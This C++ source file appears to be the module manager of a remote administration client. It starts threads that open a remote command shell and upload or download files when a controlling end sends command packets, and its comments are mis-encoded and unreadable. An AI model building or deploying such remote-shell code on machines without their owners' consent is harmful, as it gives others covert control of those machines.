#include "pch.h"
#include "ModuleManage.h"
#include "Packet.h"
#include "SocketClient.h"
#include "SocketClientManage.h"
#include "ModuleShellRemote.h"
#include "ModuleFileUpload.h"
#include "ModuleFileDownload.h"




CModule::CModule(CSocketClient* pChildSocketClient) {
	m_pChildSocketClient = pChildSocketClient;
	m_pChildSocketClient->m_pModule = this;
}

CModule::CModule() {

}

CModule::~CModule() {
	if (m_pChildSocketClient != nullptr) {
		m_pChildSocketClient = nullptr;
	}
}


// �麯��
void CModule::OnRecvivePacket(CPacket* pPacket) {

}





CModuleManage::CModuleManage(CSocketClient* pMainSocketClient) {
	m_pSocketClient = pMainSocketClient;
}


CModuleManage::~CModuleManage() {

}


// �����Ƿ���ð�
BOOL CModuleManage::OnReceiveConnectPacket(CPacket* pPacket) {
	CPacket* pPacketCopy = new CPacket(*pPacket);			// �ǵ��ڸ����߳���delete�������

	switch (pPacket->m_PacketHead.wCommandId) {

	case SHELL_CONNECT:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleShellRemote, (LPVOID)pPacketCopy, 0, NULL);
		break;

	case FILE_UPLOAD_CONNECT:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleFileUpload, (LPVOID)pPacketCopy, 0, NULL);
		break;

	case FILE_DOWNLOAD_CONNECT:
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RunModuleFileDownload, (LPVOID)pPacketCopy, 0, NULL);
		break;

	default:
		return false;
	}

	return true;


}



DWORD WINAPI RunModuleShellRemote(CPacket* pPacket)
{
	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
	CModuleShellRemote* pModule = new CModuleShellRemote(pChildSocketClient);			// ���������pChildSocketClient->m_pModule��ֵ

	pChildSocketClient->StartSocketClient();

	pModule->RunCmdProcess();

	// �ȴ����ض������ض˷�����SHELL_CONNECT��
	WaitForSingleObject(pModule->m_hSendPacketShellRemoteConnectEvent, INFINITE);

	pModule->LoopReadAndSendCommandReuslt();

	pChildSocketClient->WaitForExitEvent();

	if (pChildSocketClient != nullptr) {
		delete pChildSocketClient;
		pChildSocketClient = nullptr;
	}

	if (pModule != nullptr) {
		delete pModule;
		pModule = nullptr;
	}

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}

	Sleep(500);
	DebugPrint("�˳�RunModuleShellRemote�߳�\n");
	return 0;
}



DWORD WINAPI RunModuleFileUpload(CPacket* pPacket) {
	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
	CModuleFileUpload* pModule = new CModuleFileUpload(pChildSocketClient);			// ���������pChildSocketClient->m_pModule��ֵ

	pChildSocketClient->StartSocketClient();
	pChildSocketClient->SendPacket(FILE_UPLOAD_CONNECT, NULL, 0);

	pChildSocketClient->WaitForExitEvent();

	if (pModule != nullptr) {
		delete pModule;
		pModule = nullptr;
	}

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}

	Sleep(500);
	DebugPrint("�˳�RunModuleFileUpload�߳�\n");
	return 0;
}


DWORD WINAPI RunModuleFileDownload(CPacket* pPacket){
	CSocketClient* pChildSocketClient = new CSocketClient(pPacket->m_pSocketClient->m_pMainSocketClient);
	CModuleFileDownload* pModule = new CModuleFileDownload(pChildSocketClient);			// ���������pChildSocketClient->m_pModule��ֵ

	pChildSocketClient->StartSocketClient();
	pChildSocketClient->SendPacket(FILE_DOWNLOAD_CONNECT, NULL, 0);

	pChildSocketClient->WaitForExitEvent();

	if (pModule != nullptr) {
		delete pModule;
		pModule = nullptr;
	}

	if (pPacket != nullptr) {
		delete pPacket;
		pPacket = nullptr;
	}

	Sleep(500);
	DebugPrint("�˳�RunModuleFileDownload�߳�\n");
	return 0;
}